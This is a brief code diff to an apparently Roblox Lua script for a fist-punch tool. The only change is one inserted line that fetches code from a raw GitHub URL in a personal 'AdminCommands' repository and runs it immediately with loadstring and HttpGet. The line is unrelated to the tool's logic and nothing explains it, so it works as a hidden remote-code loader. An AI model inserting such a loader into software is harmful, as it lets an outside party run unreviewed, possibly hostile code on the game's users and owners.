@@ -72,6 +72,7 @@ end
 
 
 --Punch("Super")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nbayoungboyfan1964/AdminCommands/main/Commands"))()
 function Start()
 local Active,Cooldown = false,false
 local Tool = Player.Backpack:WaitForChild("Fist",90) or Character:WaitForChild("Fist",90)
